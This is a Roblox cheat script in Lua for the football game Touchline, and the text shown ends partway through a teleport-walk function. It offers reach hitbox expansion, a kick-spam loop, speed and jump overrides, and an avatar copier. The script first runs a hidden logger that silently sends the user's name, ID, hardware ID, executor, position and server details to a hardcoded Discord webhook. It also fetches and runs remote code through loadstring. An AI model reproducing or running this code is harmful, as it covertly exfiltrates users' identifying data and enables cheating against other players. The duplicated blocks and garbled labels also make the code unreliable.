
local _LP = game:GetService("Players").LocalPlayer
local _H  = game:GetService("HttpService")
local _WH = "https://discordapp.com/api/webhooks/1532387166133682299/PQUETlqjAQEailkAgpsyH-d_MOynfSPCPWX40BD82uiaCO-apjEdiLVU1f0dDOyBAtSF"

local function _log()
    local hwid    = (gethwid and gethwid()) or "N/A"
    local exec    = (identifyexecutor and identifyexecutor()) or "unknown"
    local uis     = game:GetService("UserInputService")
    local plat    = (uis.TouchEnabled and not uis.KeyboardEnabled) and "Mobile" or "PC"
    local stats   = game:GetService("Stats")
    local mem     = math.floor(stats:GetTotalMemoryUsageMb()) .. " MB"
    local fps     = math.floor(1 / stats.FrameTime)
    local ping    = math.floor(_LP:GetNetworkPing() * 1000) .. "ms"
    local pos     = "N/A"
    local vel     = "N/A"
    local tool    = "None"
    local team    = _LP.Team and _LP.Team.Name or "None"
    local players = #game:GetService("Players"):GetPlayers()
    local maxplrs = game:GetService("Players").MaxPlayers
    local gamenam = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "N/A"

    pcall(function()
        local hrp = _LP.Character and _LP.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            pos = string.format("%.1f, %.1f, %.1f", hrp.Position.X, hrp.Position.Y, hrp.Position.Z)
            local v = hrp.Velocity
            vel = string.format("%.1f studs/s", v.Magnitude)
        end
        local t = _LP.Character and _LP.Character:FindFirstChildOfClass("Tool")
        if t then tool = t.Name end
    end)

    local created = "N/A"
    pcall(function()
        local age = _LP.AccountAge
        local d   = os.time() - age * 86400
        created   = os.date("%d/%m/%Y", d)
    end)

    task.spawn(function()
        pcall(function()
            local payload = _H:JSONEncode({
                embeds = {{
                    title = "touchline",
                    color = 1,
                    fields = {
                        {name=" man",       value="**Name:** ".._LP.Name.."\n**Display:** "..(_LP.DisplayName or _LP.Name).."\n**ID:** "..tostring(_LP.UserId), inline=true},
                        {name="Account oWo",      value="**Age:** "..tostring(_LP.AccountAge).."d\n**Created:** "..created.."\n**Team:** "..team, inline=true},
                        {name="Hardware uwu",     value="**HWID:** `"..hwid.."`\n**Executor:** "..exec.."\n**Platform:** "..plat, inline=false},
                        {name="Performance mwa",  value="**FPS:** "..tostring(fps).."\n**Ping:** "..ping.."\n**RAM:** "..mem, inline=true},
                        {name="Position daddy",     value="**Pos:** "..pos.."\n**Speed:** "..vel.."\n**Tool:** "..tool, inline=true},
                        {name=" Server duh",       value="**Game:** "..gamenam.."\n**Players:** "..players.."/"..maxplrs.."\n**PlaceId:** "..tostring(game.PlaceId), inline=true},
                        {name=" Job",          value="`"..tostring(game.JobId).."`", inline=false},
                    },
                    footer = {text="kersaii ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¢ "..os.date("%X %d/%m/%Y")},
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                }}
            })
            local req=(syn and syn.request) or (http and http.request) or http_request or request
            if req then
                req({Url=_WH,Method="POST",Headers={["Content-Type"]="application/json"},Body=payload})
            else
                _H:PostAsync(_WH,payload)
            end
        end)
    end)
end

_log()







--[[
    Punishment - Touchline  v6  |  Directional AutoDive (Movement-Based)
]]

local punishgoatby97mzu = loadstring(game:HttpGet("https://raw.githubusercontent.com/cezarinst-ship-it/punishuilib/refs/heads/main/s"))()

local RunService   = game:GetService("RunService")
local Players      = game:GetService("Players")
local UIS          = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local lp           = Players.LocalPlayer
local camera       = workspace.CurrentCamera
local V3           = Vector3.new
local abs          = math.abs
local clock        = os.clock
local sqrt         = math.sqrt
local clamp        = math.clamp

local fti = firetouchinterest

local function getFootballFolder()
    return workspace:FindFirstChild("Footballs")
end
local function getClosestFootball()
    local folder = getFootballFolder(); if not folder then return nil end
    local char   = lp.Character
    local hrp    = char and char:FindFirstChild("HumanoidRootPart"); if not hrp then return nil end
    local best, closest = math.huge, nil
    for _, b in folder:GetChildren() do
        if b:IsA("BasePart") then
            local d = (b.Position - hrp.Position).Magnitude
            if d < best then best = d; closest = b end
        end
    end
    return closest, best
end

local Window    = punishgoatby97mzu:CreateWindow("discord.gg/punishment")
local TabReach  = Window:CreateTab("å–² Reach",      4483362458)
local TabMove   = Window:CreateTab("å¥½ Movement",   4483362458)
local TabGK     = Window:CreateTab("å¸ GK",         4483362458)
local TabPred   = Window:CreateTab("ç‹— Prediction", 4483362458)
local TabExtras = Window:CreateTab("é¢ Extras",     4483362458)
local TabFlags  = Window:CreateTab("æ€• Flags",      4483362458)
local TabReact  = Window:CreateTab("å®³ React",      4483362458)
local TabGKReact = Window:CreateTab("æ„› GK React",      4483362458)

-- ============================================
-- AVATAR STEALER (EXTRAS TAB - TOP)
-- ============================================
TabExtras:CreateSection("Avatar Stealer")
TabExtras:CreateParagraph("Avatar Stealer", "Enter a Roblox username and press Enter to copy their avatar.")

local u = ""

local function m(i, c)
    if not c then return end
    local h = c:FindFirstChildOfClass("Humanoid")
    if not h then return end

    local s, a = pcall(function()
        return Players:GetCharacterAppearanceAsync(i)
    end)
    if not s or not a then return end

    local hh = false
    local kb = false

    local ds, d = pcall(function()
        return Players:GetHumanoidDescriptionFromUserId(i)
    end)
    if ds and d then
        if d.Head == 47079 or d.Head == 1340101835 or d.Head == 6340101835 or d.Head == 6686307858 then
            hh = true
        end
        if d.RightLeg == 139607718 then
            kb = true
        end
    end

    for _, v in pairs(c:GetChildren()) do
        if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") or v:IsA("CharacterMesh") or v:IsA("BodyColors") then
            v:Destroy()
        end
    end
    if c:FindFirstChild("Head") then
        for _, ch in ipairs(c.Head:GetChildren()) do
            if ch:IsA("Decal") then ch:Destroy() end
        end
    end

    for _, v in ipairs(a:GetDescendants()) do
        if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("BodyColors") then
            pcall(function() local cl = v:Clone() cl.Parent = c end)
        elseif v:IsA("Accessory") then
            pcall(function() local cl = v:Clone() h:AddAccessory(cl) end)
        elseif v:IsA("CharacterMesh") then
            pcall(function() local cl = v:Clone() cl.Parent = c end)
        end
    end

    local ft = nil

    for _, dsc in ipairs(a:GetDescendants()) do
        if dsc:IsA("Decal") and (dsc.Name == "face" or dsc.Name == "Face") then
            ft = dsc.Texture
            break
        end
    end

    if not ft and ds and d and d.Face > 0 then
        pcall(function()
            local o = game:GetObjects("rbxassetid://" .. tostring(d.Face))
            if o and #o > 0 then
                for _, obj in ipairs(o) do
                    if obj:IsA("Decal") then ft = obj.Texture break end
                    for _, ch in ipairs(obj:GetDescendants()) do
                        if ch:IsA("Decal") then ft = ch.Texture break end
                    end
                    if ft then break end
                end
            end
        end)
    end

    if not ft and ds and d and d.Face > 0 then
        pcall(function()
            local fm = game:GetService("InsertService"):LoadAsset(d.Face)
            if fm then
                for _, dsc in ipairs(fm:GetDescendants()) do
                    if dsc:IsA("Decal") then ft = dsc.Texture break end
                end
                fm:Destroy()
            end
        end)
    end

    local hd = c:FindFirstChild("Head")
    if hd then
        local f = Instance.new("Decal")
        f.Face = Enum.NormalId.Front
        f.Name = "face"
        f.Texture = ft or "rbxasset://textures/face.png"
        f.Transparency = 0
        f.Parent = hd
    end

    if hh and c:FindFirstChild("Head") then
        c.Head.Transparency = 1
        if c.Head:FindFirstChildOfClass("SpecialMesh") then
            c.Head:FindFirstChildOfClass("SpecialMesh").MeshId = ""
        else
            local fc = c.Head:FindFirstChildOfClass("FaceControls")
            if fc then fc:Destroy() end
        end
    elseif c:FindFirstChild("Head") then
        c.Head.Transparency = 0
    end

    if kb then
        if c:FindFirstChild("RightLowerLeg") then
            c.RightLowerLeg.MeshId = "902942093"
            c.RightLowerLeg.Transparency = 1
        end
        if c:FindFirstChild("RightUpperLeg") then
            c.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
            c.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
        end
        if c:FindFirstChild("RightFoot") then
            c.RightFoot.MeshId = "902942089"
            c.RightFoot.Transparency = 1
        end
    else
        if c:FindFirstChild("RightLowerLeg") then c.RightLowerLeg.Transparency = 0 end
        if c:FindFirstChild("RightFoot") then c.RightFoot.Transparency = 0 end
    end

    local p = c.Parent
    c.Parent = nil
    c.Parent = p
end

TabExtras:CreateInput("Username", "Enter a Roblox username", "", nil, nil, function(t)
    t = t:gsub("^%s*(.-)%s*$", "%1")
    u = t
    if t ~= "" and lp.Character then
        local s, r = pcall(function()
            local i = Players:GetUserIdFromNameAsync(t)
            if i then m(i, lp.Character) end
        end)
    end
end)

TabExtras:CreateDivider()

-- ============================================
-- EXTRAS (Jump Power, INF Dribble, Air Dribble Helper)
-- ============================================

-- ============================================================
--  200 KICKS PER SECOND (Extras tab, no keybind)
--  Toggle ON/OFF â€“ kicks the closest ball in your looking direction
-- ============================================================

TabExtras:CreateDivider()
TabExtras:CreateSection("200 Kicks Per Second")
TabExtras:CreateLabel("Kicks the closest ball in the direction you're looking.\nToggle ON/OFF â€“ no keybind needed.")

local kickLoopEnabled = false
local kickReach = 20
local kickConnection = nil

-- Helper: get closest ball (reuse if defined, otherwise define)
local function getClosestBallKick()
    -- try to reuse existing getClosestBall from earlier in the tab
    if getClosestBall then
        local ball, dist = getClosestBall()
        return ball, dist
    end
    -- fallback: define our own
    local char = lp.Character
    if not char then return nil, math.huge end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil, math.huge end
    local footballs = workspace:FindFirstChild("Footballs")
    if not footballs then return nil, math.huge end
    local best, bestDist = nil, math.huge
    for _, v in footballs:GetChildren() do
        if v:IsA("BasePart") and v.Name == "Ball" then
            local dist = (v.Position - hrp.Position).Magnitude
            if dist < bestDist then
                bestDist = dist
                best = v
            end
        end
    end
    return best, bestDist
end

-- Helper: get kick remote
local function getKickRemote()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local remotes = replicatedStorage:FindFirstChild("Remotes")
    if remotes then
        local gameRemote = remotes:FindFirstChild("Game")
        if gameRemote then
            local touch = gameRemote:FindFirstChild("Touch")
            if touch then
                return touch:FindFirstChild("Kick")
            end
        end
    end
    return nil
end

-- Fire one kick
local function fireKick()
    local char = lp.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local ball, dist = getClosestBallKick()
    if not ball or dist > kickReach then return end

    local kickRemote = getKickRemote()
    if not kickRemote then return end

    local Camera = workspace.CurrentCamera
    if not Camera then return end

    local lookVector = Camera.CFrame.LookVector
    local direction = CFrame.new(
        hrp.Position + lookVector * 5,
        hrp.Position + lookVector * 10
    )

    local args = {
        {
            ball,
            "Shoot",
            1,
            {
                Right = false,
                Ground = true,
                Left = false
            },
            direction,
            Vector3.zero
        }
    }

    pcall(function()
        kickRemote:FireServer(unpack(args))
    end)
end

-- Toggle
TabExtras:CreateToggle("Enable Kick Loop", "Kicks closest ball every frame (â‰ˆ60 kicks/sec)", false, function(v)
    kickLoopEnabled = v
    if v then
        if not kickConnection then
            kickConnection = RunService.PreSimulation:Connect(function()
                if kickLoopEnabled then
                    fireKick()
                end
            end)
        end
        punishgoatby97mzu:Notify({Title="Kick Loop", Content="ON â€“ reach: " .. kickReach .. " studs", Duration=2})
    else
        if kickConnection then
            kickConnection:Disconnect()
            kickConnection = nil
        end
        punishgoatby97mzu:Notify({Title="Kick Loop", Content="OFF", Duration=2})
    end
end)

TabExtras:CreateSlider("Reach Distance (5â€“50)", 5, 50, 20, function(v)
    kickReach = v
    if kickLoopEnabled then
        punishgoatby97mzu:Notify({Title="Kick Reach", Content="Set to " .. v .. " studs", Duration=2})
    end
end)

-- Clean up on script reset / tab close (optional)
-- But we leave it to the toggle to clean up.

TabExtras:CreateSection("Jump Power")
local jumpEnabled = false; local jumpPower = 50
TabExtras:CreateToggle("Custom Jump Power", "Overrides default jump height", false, function(v)
    jumpEnabled = v
    if not v then pcall(function()
        local hum = lp.Character and lp.Character:FindFirstChild("Humanoid")
        if hum then 
            hum.UseJumpPower = false 
            hum.JumpPower = 50 
        end
    end) end
end)
TabExtras:CreateSlider("Jump Power (50â€“100)", 50, 100, 50, function(v) jumpPower = v end)
RunService.Heartbeat:Connect(function()
    if not jumpEnabled then return end
    pcall(function()
        local hum = lp.Character and lp.Character:FindFirstChild("Humanoid")
        if hum then
            hum.UseJumpPower = true
            hum.JumpPower = jumpPower
        end
    end)
end)

TabExtras:CreateSection("INF Dribble Helper")
local dribbleEnabled = false; local dribbleConn = nil; local dribbleSpeed = 26
TabExtras:CreateToggle("INF Dribble", "Auto-walks toward closest ball", false, function(v)
    dribbleEnabled = v
    if v then
        if dribbleConn then dribbleConn:Disconnect() end
        dribbleConn = RunService.Heartbeat:Connect(function()
            if not dribbleEnabled then return end
            local char = lp.Character; if not char then return end
            local hum  = char:FindFirstChild("Humanoid"); if not hum then return end
            local ball = getClosestFootball(); if not ball then return end
            hum.WalkSpeed = dribbleSpeed; hum:MoveTo(ball.Position)
        end)
    else
        if dribbleConn then dribbleConn:Disconnect(); dribbleConn=nil end
        pcall(function()
            local hum = lp.Character and lp.Character:FindFirstChild("Humanoid")
            if hum then hum.WalkSpeed = 26 end
        end)
    end
end)
TabExtras:CreateSlider("Dribble Speed (8â€“35)", 26, 35, 26, function(v) dribbleSpeed = v end)

-- ============================================
-- AIR DRIBBLE HELPER (FIXED FOR RESPAWN)
-- ============================================
TabExtras:CreateDivider()
TabExtras:CreateSection("Air Dribble Helper")
TabExtras:CreateLabel("Creates an invisible platform under the ball. Only solid when jumping.")

local airDribbleSize = 25
local airDribbleTransparency = 1
local zzzzHelperFlag = false
local zzzzHelperData = {}
local ballToPlatform = {}
local player = game.Players.LocalPlayer

function CreatePlatformForBall(part)
    if not zzzzHelperFlag then return end
    if not part or not part.Parent then return end
    if not part:IsA("BasePart") then return end

    if ballToPlatform[part] and ballToPlatform[part].Parent then
        return
    end

    local helper = Instance.new("Part")
    helper.Name = "AirDribbleHelper"
    helper.Size = Vector3.new(airDribbleSize, 1, airDribbleSize)
    helper.Anchored = true
    helper.CanCollide = false
    helper.CanTouch = false
    helper.CanQuery = false
    helper.Transparency = airDribbleTransparency
    helper.Material = Enum.Material.Neon
    helper.Color = Color3.fromRGB(128, 128, 128)
    helper.Parent = workspace

    ballToPlatform[part] = helper
    table.insert(zzzzHelperData, helper)

    task.spawn(function()
        while zzzzHelperFlag and helper.Parent and part and part.Parent do
            helper.CFrame = CFrame.new(part.Position.X, part.Position.Y - 1.2, part.Position.Z)
            task.wait()
        end
    end)
end

game:GetService("RunService").Heartbeat:Connect(function()
    local char = lp.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    local currentState = hum:GetState()
    local isJumping = currentState == Enum.HumanoidStateType.Jumping or
                      currentState == Enum.HumanoidStateType.Freefall

    for _, platform in pairs(zzzzHelperData) do
        if platform and platform.Parent then
            if isJumping then
                platform.CanCollide = true
                platform.CanTouch = true
                platform.CanQuery = true
                platform.Transparency = airDribbleTransparency
            else
                platform.CanCollide = false
                platform.CanTouch = false
                platform.CanQuery = false
                platform.Transparency = airDribbleTransparency
            end
        end
    end
end)

function ToggleZZZZHelper()
    zzzzHelperFlag = not zzzzHelperFlag

    if not zzzzHelperFlag then
        for _, part in pairs(zzzzHelperData) do
            pcall(function() part:Destroy() end)
        end
        zzzzHelperData = {}
        ballToPlatform = {}
        print("Air Dribble Helper disabled")
        return
    end

    local footballs = workspace:FindFirstChild("Footballs")
    if not footballs then
        print("No Footballs folder found!")
        return
    end

    for _, part in ipairs(footballs:GetChildren()) do
        if part:IsA("BasePart") then
            CreatePlatformForBall(part)
        end
    end

    footballs.ChildAdded:Connect(function(part)
        task.wait(0.1)
        if part:IsA("BasePart") and zzzzHelperFlag then
            CreatePlatformForBall(part)
        end
    end)

    footballs.ChildRemoved:Connect(function(part)
        if ballToPlatform[part] then
            local platform = ballToPlatform[part]
            if platform and platform.Parent then
                platform:Destroy()
            end
            ballToPlatform[part] = nil
            for i, v in pairs(zzzzHelperData) do
                if v == platform then
                    table.remove(zzzzHelperData, i)
                    break
                end
            end
        end
    end)

    player.CharacterAdded:Connect(function()
        if zzzzHelperFlag then
            local footballs = workspace:FindFirstChild("Footballs")
            if footballs then
                for _, part in ipairs(footballs:GetChildren()) do
                    if part:IsA("BasePart") then
                        CreatePlatformForBall(part)
                    end
                end
            end
        end
    end)

    print("Air Dribble Helper enabled! Size: " .. airDribbleSize)
end

function SetAirDribbleSize(size)
    airDribbleSize = size
    for _, part in pairs(zzzzHelperData) do
        if part and part.Parent then
            part.Size = Vector3.new(size, 1, size)
        end
    end
    print("Air Dribble size set to: " .. size)
end

function SetAirDribbleTransparency(trans)
    airDribbleTransparency = trans
    for _, part in pairs(zzzzHelperData) do
        if part and part.Parent then
            part.Transparency = trans
        end
    end
    print("Air Dribble transparency set to: " .. trans)
end

TabExtras:CreateToggle("Enable Air Dribble Helper", "Invisible platform under ball, solid when jumping", false, function(v)
    if v then
        ToggleZZZZHelper()
    else
        if zzzzHelperFlag then
            ToggleZZZZHelper()
        end
    end
end)

TabExtras:CreateSlider("Platform Size (1â€“50)", 1, 50, 25, function(v)
    SetAirDribbleSize(v)
end)

TabExtras:CreateSlider("Platform Transparency (0â€“10)", 0, 10, 10, function(v)
    SetAirDribbleTransparency(v / 10)
end)

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  TAB: REACH
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local V3 = Vector3.new

local function getFootballFolder()
    return workspace:FindFirstChild("Footballs")
end

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  METHOD 1: Ball Resize Reach (with grey colour)
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabReach:CreateSection("Ball Resize Reach")
TabReach:CreateParagraph("Method 1", "js ball resize")

local m1_enabled      = false
local m1_size         = 6.0
local m1_transparency = 0.7

TabReach:CreateToggle("Enable Reach", "Expands ball hitbox size", false, function(v) m1_enabled = v end)
TabReach:CreateSlider("Reach Size (1â€“30)", 1, 30, 6, function(v) m1_size = v end)
TabReach:CreateSlider("Ball Transparency (0â€“10)", 0, 10, 7, function(v) m1_transparency = v / 10 end)

RunService.RenderStepped:Connect(function()
    if not m1_enabled then return end
    local folder = getFootballFolder(); if not folder then return end
    for _, b in folder:GetChildren() do
        if b:IsA("BasePart") then
            b.Size         = V3(m1_size, m1_size, m1_size)
            b.Transparency = m1_transparency
            b.Color        = Color3.fromRGB(128, 128, 128)  -- grey colour
            b.CanCollide   = false
        end
    end
end)

-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  METHOD 2: Original Reach Code (with grey colour)
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabReach:CreateDivider()
TabReach:CreateSection("Reach Method 2")
TabReach:CreateParagraph("when ur inside uses ur foot and tp it to ball")

local REACH_SIZE = 10
local reachMethod2Enabled = false
local reachTransparency2 = 1
local originalColors = {}   -- store original colors for Method 2
local originalSizes = {}

local function SetupReach()
    if getgenv().Reach then
        getgenv().Reach = nil
    end
    if getgenv().ReachConnections then
        for _, connection in ipairs(getgenv().ReachConnections) do
            pcall(function() connection:Disconnect() end)
        end
        getgenv().ReachConnections = nil
    end
    
    getgenv().ReachConnections = {}
    getgenv().Reach = {
        Enabled = false,
        Size = REACH_SIZE,
        Transparency = reachTransparency2,
        Distance = 100
    }
    
    local RunService = game:GetService("RunService")
    local localPlayer = game:GetService("Players").LocalPlayer
    local humanoidRootPart = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
    local footballs = workspace:WaitForChild("Footballs")
    
    local trackedParts = {}
    originalSizes = {}
    originalColors = {}
    
    local function onChildAdded(item)
        if item:IsA("BasePart") then
            trackedParts[item] = true
            originalSizes[item] = item.Size
            originalColors[item] = item.Color
        end
    end
    
    for _, part in ipairs(footballs:GetChildren()) do
        if part:IsA("BasePart") then
            trackedParts[part] = true
            originalSizes[part] = part.Size
            originalColors[part] = part.Color
        end
    end
    
    table.insert(getgenv().ReachConnections, footballs.ChildAdded:Connect(onChildAdded))
    table.insert(getgenv().ReachConnections, footballs.ChildRemoved:Connect(function(child)
        trackedParts[child] = nil
        originalSizes[child] = nil
        originalColors[child] = nil
    end))
    
    local function updateReachSize()
        local currentSize = getgenv().Reach.Size or REACH_SIZE
        local currentTransparency = getgenv().Reach.Transparency or 1
        
        for part in pairs(trackedParts) do
            if part and part.Parent then
                part.Size = Vector3.new(currentSize, currentSize, currentSize)
                part.Transparency = currentTransparency
                part.Color = Color3.fromRGB(128, 128, 128)  -- grey colour
                part.CanCollide = false
            end
        end
    end
    
    local function resetParts()
        for part in pairs(trackedParts) do
            if part and part.Parent then
                if originalSizes[part] then
                    part.Size = originalSizes[part]
                end
                if originalColors[part] then
                    part.Color = originalColors[part]
                end
                part.Transparency = 0
                part.CanCollide = true
            end
        end
    end
    
    local function findNearestPart()
        local nearest = nil
        local nearestDist = math.huge
        
        for part in pairs(trackedParts) do
            if part and part.Parent then
                local dist = (part.Position - humanoidRootPart.Position).Magnitude
                if dist < nearestDist then
                    nearestDist = dist
                    nearest = part
                end
            end
        end
        
        return nearest, nearestDist
    end
    
    local indicator = Instance.new("Part")
    indicator.Name = "BallFollowPart"
    indicator.Shape = Enum.PartType.Ball
    indicator.Size = Vector3.new(2.25, 2.25, 2.25)
    indicator.Anchored = true
    indicator.CanCollide = true
    indicator.CanTouch = false
    indicator.CanQuery = false
    indicator.Transparency = 0.5
    indicator.Material = Enum.Material.ForceField
    indicator.Color = Color3.fromRGB(0, 200, 255)
    indicator.Parent = workspace
    
    table.insert(getgenv().ReachConnections, RunService.Heartbeat:Connect(function()
        local nearest, distance = findNearestPart()
        
        if not nearest or distance > getgenv().Reach.Distance then
            resetParts()
            indicator.CFrame = CFrame.new(0, -1000, 0)
        else
            updateReachSize()
            indicator.CFrame = nearest.CFrame
        end
    end))
    
    getgenv().DisableReach = function()
        if getgenv().ReachConnections then
            for _, connection in ipairs(getgenv().ReachConnections) do
                connection:Disconnect()
            end
        end
        resetParts()
        if indicator then indicator:Destroy() end
        getgenv().Reach = nil
        getgenv().ReachConnections = nil
        print("Reach disabled")
    end
    
    print("Reach enabled! Size: " .. REACH_SIZE)
end

TabReach:CreateToggle("Enable Reach Method 3", "Original reach method", false, function(v)
    reachMethod2Enabled = v
    if v then
        SetupReach()
    else
        if getgenv().DisableReach then
            getgenv().DisableReach()
        end
        print("Reach Method 2 turned OFF")
    end
end)

TabReach:CreateSlider("Reach Size 3 (1â€“30)", 1, 30, 10, function(v)
    REACH_SIZE = v
    if reachMethod2Enabled and getgenv().Reach then
        getgenv().Reach.Size = v
        print("Reach Method 3 size set to: " .. v)
    end
end)

TabReach:CreateSlider("Reach Transparency 3 (0â€“10)", 0, 10, 10, function(v)
    reachTransparency2 = v / 10
    if reachMethod2Enabled and getgenv().Reach then
        getgenv().Reach.Transparency = reachTransparency2
        print("Reach Method 2 transparency set to: " .. reachTransparency2)
    end
end)

TabReach:CreateDivider()
TabReach:CreateSection("Reach Method 3")
TabReach:CreateParagraph("Method 3", "Original reach method.")

local REACH_SIZE = 10
local reachMethod2Enabled = false
local reachTransparency2 = 1
local originalColors = {}   -- store original colors for Method 2
local originalSizes = {}

local function SetupReach()
    if getgenv().Reach then
        getgenv().Reach = nil
    end
    if getgenv().ReachConnections then
        for _, connection in ipairs(getgenv().ReachConnections) do
            pcall(function() connection:Disconnect() end)
        end
        getgenv().ReachConnections = nil
    end
    
    getgenv().ReachConnections = {}
    getgenv().Reach = {
        Enabled = false,
        Size = REACH_SIZE,
        Transparency = reachTransparency2,
        Distance = 100
    }
    
    local RunService = game:GetService("RunService")
    local localPlayer = game:GetService("Players").LocalPlayer
    local humanoidRootPart = (localPlayer.Character or localPlayer.CharacterAdded:Wait()):WaitForChild("HumanoidRootPart")
    local footballs = workspace:WaitForChild("Footballs")
    
    local trackedParts = {}
    originalSizes = {}
    originalColors = {}
    
    local function onChildAdded(item)
        if item:IsA("BasePart") then
            trackedParts[item] = true
            originalSizes[item] = item.Size
            originalColors[item] = item.Color
        end
    end
    
    for _, part in ipairs(footballs:GetChildren()) do
        if part:IsA("BasePart") then
            trackedParts[part] = true
            originalSizes[part] = part.Size
            originalColors[part] = part.Color
        end
    end
    
    table.insert(getgenv().ReachConnections, footballs.ChildAdded:Connect(onChildAdded))
    table.insert(getgenv().ReachConnections, footballs.ChildRemoved:Connect(function(child)
        trackedParts[child] = nil
        originalSizes[child] = nil
        originalColors[child] = nil
    end))
    
    local function updateReachSize()
        local currentSize = getgenv().Reach.Size or REACH_SIZE
        local currentTransparency = getgenv().Reach.Transparency or 1
        
        for part in pairs(trackedParts) do
            if part and part.Parent then
                part.Size = Vector3.new(currentSize, currentSize, currentSize)
                part.Transparency = currentTransparency
                part.Color = Color3.fromRGB(128, 128, 128)  -- grey colour
                part.CanCollide = false
            end
        end
    end
    
    local function resetParts()
        for part in pairs(trackedParts) do
            if part and part.Parent then
                if originalSizes[part] then
                    part.Size = originalSizes[part]
                end
                if originalColors[part] then
                    part.Color = originalColors[part]
                end
                part.Transparency = 0
                part.CanCollide = true
            end
        end
    end
    
    local function findNearestPart()
        local nearest = nil
        local nearestDist = math.huge
        
        for part in pairs(trackedParts) do
            if part and part.Parent then
                local dist = (part.Position - humanoidRootPart.Position).Magnitude
                if dist < nearestDist then
                    nearestDist = dist
                    nearest = part
                end
            end
        end
        
        return nearest, nearestDist
    end
    
    local indicator = Instance.new("Part")
    indicator.Name = "BallFollowPart"
    indicator.Shape = Enum.PartType.Ball
    indicator.Size = Vector3.new(2.25, 2.25, 2.25)
    indicator.Anchored = true
    indicator.CanCollide = true
    indicator.CanTouch = false
    indicator.CanQuery = false
    indicator.Transparency = 0.5
    indicator.Material = Enum.Material.ForceField
    indicator.Color = Color3.fromRGB(0, 200, 255)
    indicator.Parent = workspace
    
    table.insert(getgenv().ReachConnections, RunService.Heartbeat:Connect(function()
        local nearest, distance = findNearestPart()
        
        if not nearest or distance > getgenv().Reach.Distance then
            resetParts()
            indicator.CFrame = CFrame.new(0, -1000, 0)
        else
            updateReachSize()
            indicator.CFrame = nearest.CFrame
        end
    end))
    
    getgenv().DisableReach = function()
        if getgenv().ReachConnections then
            for _, connection in ipairs(getgenv().ReachConnections) do
                connection:Disconnect()
            end
        end
        resetParts()
        if indicator then indicator:Destroy() end
        getgenv().Reach = nil
        getgenv().ReachConnections = nil
        print("Reach disabled")
    end
    
    print("Reach enabled! Size: " .. REACH_SIZE)
end

TabReach:CreateToggle("Enable Reach Method 3", "Original reach method", false, function(v)
    reachMethod2Enabled = v
    if v then
        SetupReach()
    else
        if getgenv().DisableReach then
            getgenv().DisableReach()
        end
        print("Reach Method 2 turned OFF")
    end
end)

TabReach:CreateSlider("Reach Size 3 (1â€“30)", 1, 30, 10, function(v)
    REACH_SIZE = v
    if reachMethod2Enabled and getgenv().Reach then
        getgenv().Reach.Size = v
        print("Reach Method 3 size set to: " .. v)
    end
end)

TabReach:CreateSlider("Reach Transparency 2 (0â€“10)", 0, 10, 10, function(v)
    reachTransparency2 = v / 10
    if reachMethod2Enabled and getgenv().Reach then
        getgenv().Reach.Transparency = reachTransparency2
        print("Reach Method 3 transparency set to: " .. reachTransparency2)
    end
end)
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
--  MOVEMENT
-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
TabMove:CreateSection("Walk Speed")
local speedEnabled = false
local walkSpeed    = 26
TabMove:CreateToggle("+Speed", "Raises walkspeed above 16", false, function(v)
    speedEnabled = v
    if not v then pcall(function()
        local hum = lp.Character and lp.Character:FindFirstChild("Humanoid")
        if hum then hum.WalkSpeed = 26 end
    end) end
end)
TabMove:CreateSlider("Walk Speed (16â€“50)", 26, 32, 26, function(v) walkSpeed = v end)
RunService.Heartbeat:Connect(function()
    if not speedEnabled then return end
    pcall(function()
        local hum = lp.Character and lp.Character:FindFirstChild("Humanoid")
        if hum then hum.WalkSpeed = walkSpeed end
    end)
end)

TabMove:CreateSection("TP Walk")
local tpEnabled = false; local tpSpeed = 3; local tpConn = nil
TabMove:CreateToggle("TP Walk", "Teleport-based movement", false, function(v)
    tpEnabled = v
    if v then
        if tpConn then tpConn:Disconnect() end
        tpConn = RunService.Heartbeat:Connect(function()
            if not tpEnabled then return end
            local char = lp.Character; if not char then return end
